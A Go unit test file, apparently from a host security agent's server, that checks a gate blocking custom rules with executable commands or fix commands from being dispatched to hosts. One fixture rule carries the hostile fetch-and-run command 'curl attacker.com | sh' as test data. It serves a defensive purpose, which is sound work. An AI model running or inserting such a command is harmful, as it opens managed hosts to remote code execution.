package service

import (
	"encoding/json"
	"strings"
	"testing"

	"go.uber.org/zap"

	"github.com/matrixplusio/mxcwpp/internal/server/model"
)

func gateTestService() *TaskService {
	return &TaskService{logger: zap.NewNop()}
}

func gateTestHost() *model.Host {
	return &model.Host{HostID: "h-1", OSFamily: "rocky", RuntimeType: model.RuntimeTypeVM}
}

func execCheckConfig() model.CheckConfig {
	return model.CheckConfig{
		Condition: "all",
		Rules:     []model.CheckRule{{Type: "command_exec", Param: []string{"id", "0"}}},
	}
}

func safeCheckConfig() model.CheckConfig {
	return model.CheckConfig{
		Condition: "all",
		Rules:     []model.CheckRule{{Type: "file_permission", Param: []string{"/etc/shadow", "0640"}}},
	}
}

// dispatchedRuleIDs 从下发载荷里取出实际下发的 rule_id。
func dispatchedRuleIDs(t *testing.T, raw json.RawMessage) []string {
	t.Helper()
	var policies []struct {
		Rules []struct {
			RuleID string `json:"rule_id"`
		} `json:"rules"`
	}
	if err := json.Unmarshal(raw, &policies); err != nil {
		t.Fatalf("解析下发载荷失败: %v", err)
	}
	var ids []string
	for _, p := range policies {
		for _, r := range p.Rules {
			ids = append(ids, r.RuleID)
		}
	}
	return ids
}

func gateTestPolicy() *model.Policy {
	return &model.Policy{
		ID:       "p-1",
		OSFamily: model.StringArray{"rocky"},
		Enabled:  true,
		Rules: []model.Rule{
			{RuleID: "builtin-exec", PolicyID: "p-1", Enabled: true, Builtin: true,
				CheckConfig: execCheckConfig()},
			{RuleID: "custom-safe", PolicyID: "p-1", Enabled: true, Builtin: false,
				CheckConfig: safeCheckConfig()},
			{RuleID: "custom-check-exec", PolicyID: "p-1", Enabled: true, Builtin: false,
				CheckConfig: execCheckConfig()},
			{RuleID: "custom-fix-exec", PolicyID: "p-1", Enabled: true, Builtin: false,
				CheckConfig: safeCheckConfig(), FixConfig: model.FixConfig{Command: "curl attacker.com | sh"}},
		},
	}
}

// TestDispatchGate_ReportOnlyByDefault 默认只记审计不拦截：存量规则照常下发。
// 默认拦截会静默削减既有基线覆盖面，那不是收紧而是砍功能。
func TestDispatchGate_ReportOnlyByDefault(t *testing.T) {
	SetBlockCustomExecRules(false)
	t.Cleanup(func() { SetBlockCustomExecRules(false) })

	got := dispatchedRuleIDs(t, gateTestService().buildMultiPoliciesData(
		[]*model.Policy{gateTestPolicy()}, gateTestHost(), false))
	if len(got) != 4 {
		t.Fatalf("默认应全部下发 4 条，实际 %v", got)
	}
}

// TestDispatchGate_BlocksCustomExecWhenEnabled 开启后只拦"自定义 + 可执行"，
// 内置可执行规则与自定义结构化规则都不受影响。
func TestDispatchGate_BlocksCustomExecWhenEnabled(t *testing.T) {
	SetBlockCustomExecRules(true)
	t.Cleanup(func() { SetBlockCustomExecRules(false) })

	got := dispatchedRuleIDs(t, gateTestService().buildMultiPoliciesData(
		[]*model.Policy{gateTestPolicy()}, gateTestHost(), false))
	want := map[string]bool{"builtin-exec": true, "custom-safe": true}
	if len(got) != len(want) {
		t.Fatalf("应只下发 %v，实际 %v", want, got)
	}
	for _, id := range got {
		if !want[id] {
			t.Errorf("规则 %q 不应被下发", id)
		}
	}
}

// TestDispatchGate_CheckTaskIgnoresFixCommand 检查任务裁剪了 fix.command，
// 因此"只有 fix.command 可执行"的规则在检查态并不下发可执行内容，不应被误伤。
func TestDispatchGate_CheckTaskIgnoresFixCommand(t *testing.T) {
	SetBlockCustomExecRules(true)
	t.Cleanup(func() { SetBlockCustomExecRules(false) })

	// stripFixCommand=true 即检查任务
	got := dispatchedRuleIDs(t, gateTestService().buildMultiPoliciesData(
		[]*model.Policy{gateTestPolicy()}, gateTestHost(), true))
	joined := strings.Join(got, ",")
	if !strings.Contains(joined, "custom-fix-exec") {
		t.Errorf("检查任务不下发 fix.command，custom-fix-exec 不应被拦截，实际 %v", got)
	}
	if strings.Contains(joined, "custom-check-exec") {
		t.Errorf("custom-check-exec 含 command_exec，检查任务下仍应被拦截，实际 %v", got)
	}
}

// TestDispatchGate_FixTaskStripsFixCommandRule 修复任务会下发 fix.command，
// 此时"只有 fix.command 可执行"的自定义规则必须被拦。
func TestDispatchGate_FixTaskBlocksFixCommandRule(t *testing.T) {
	SetBlockCustomExecRules(true)
	t.Cleanup(func() { SetBlockCustomExecRules(false) })

	got := dispatchedRuleIDs(t, gateTestService().buildMultiPoliciesData(
		[]*model.Policy{gateTestPolicy()}, gateTestHost(), false))
	if strings.Contains(strings.Join(got, ","), "custom-fix-exec") {
		t.Errorf("修复任务会下发 fix.command，custom-fix-exec 应被拦截，实际 %v", got)
	}
}

// TestRuleCarriesExec 判定本身：按本次实际下发的内容算。
func TestRuleCarriesExec(t *testing.T) {
	checkExec := &model.Rule{CheckConfig: execCheckConfig()}
	fixExec := &model.Rule{CheckConfig: safeCheckConfig(), FixConfig: model.FixConfig{Command: "id"}}
	clean := &model.Rule{CheckConfig: safeCheckConfig()}

	cases := []struct {
		name  string
		rule  *model.Rule
		strip bool
		want  bool
	}{
		{"command_exec 检查任务", checkExec, true, true},
		{"command_exec 修复任务", checkExec, false, true},
		{"仅 fix.command 检查任务（已裁剪）", fixExec, true, false},
		{"仅 fix.command 修复任务", fixExec, false, true},
		{"结构化规则", clean, false, false},
	}
	for _, c := range cases {
		if got := ruleCarriesExec(c.rule, c.strip); got != c.want {
			t.Errorf("%s: got %v want %v", c.name, got, c.want)
		}
	}
}
